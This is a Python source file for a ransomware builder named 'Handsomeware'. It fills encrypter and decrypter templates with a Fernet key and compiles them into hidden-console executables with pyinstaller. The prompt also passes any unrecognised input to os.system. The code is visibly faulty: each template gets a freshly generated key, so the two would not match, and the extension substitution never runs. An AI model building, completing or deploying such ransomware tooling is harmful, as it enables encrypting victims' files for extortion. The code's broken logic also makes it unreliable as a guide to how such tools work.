import os
import subprocess
import ascii_generator
from cryptography.fernet import Fernet

class Handsomeware:
    def __init__(self) -> None:
        self.extension = ''

    def help(self):
        print(f"""

    --Commands--

    1: set extension [extension] 
    2: generate

    --Options--

    Extension: {self.extension}
        
        """)

    def key(self): 
        return Fernet.generate_key()

    def create_encrypter_file(self,extension=''):
        try:
            file_name = input("\nPlease enter name for the encrypter file>> ")
        except KeyboardInterrupt:
            breakpoint

        if '.py' not in file_name:
            file_name = file_name +".py"
        encrypter = open('encrypter.py','r')
        file = open(file_name,'w')
        for line in encrypter:
            file.write(line.replace('{Key}',f'{self.key()}'))
        for line in encrypter: 
            file.write(line.replace('{FileExtension}',extension))

        encrypter.close()
        file.close()
        subprocess.getoutput(f'pyinstaller --onefile --noconsole {file_name}')
        
    def create_decrypter_file(self):
        try:
            file_name = input("\nPlease enter name for the decrypter file>> ")
        except KeyboardInterrupt:
            breakpoint

        if '.py' not in file_name:
            file_name = file_name +".py"
        decrypter = open('decrypter.py','r')
        file = open(file_name,'w')
        for line in decrypter:
            file.write(line.replace('{Key}',f'{self.key()}'))
        decrypter.close()
        file.close()            
        subprocess.getoutput(f'pyinstaller --onefile --noconsole {file_name}')
    def start(self):
        commands=''
        ascii_generator.generate_ascii()

        while commands !='exit':
            try:
                commands = input("Handsomeware>> ")    
            except KeyboardInterrupt:
                exit()    

            if commands =='help':
                self.help()

            elif 'set extension' in commands:

                self.extension = commands.split(' ')[-1]

                if '.' not in self.extension[0]:
                    self.extension = '.'+ self.extension

                print(f"extension : {self.extension}")
                

            elif commands == 'generate':
                self.create_encrypter_file(self.extension)
                self.create_decrypter_file()    

            else:
                os.system(commands)

Handsomeware().start()                
